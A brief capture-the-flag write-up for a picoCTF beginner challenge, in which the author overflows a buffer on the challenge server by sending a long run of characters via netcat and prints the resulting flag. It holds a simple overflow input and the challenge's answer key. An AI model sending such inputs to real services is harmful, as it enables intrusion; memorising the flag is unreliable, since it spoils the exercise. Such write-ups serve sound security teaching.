## Challenge Description

Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 59694

## Solution

Guided by the name of the challenge my first instinct was to enter data repeatedly to cause buffer overflow
```bash
root@MeenakshiSangeeth:~# nc saturn.picoctf.net 59694
Input: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```
Eureka it worked!!
Thus the flag for this challenge is picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
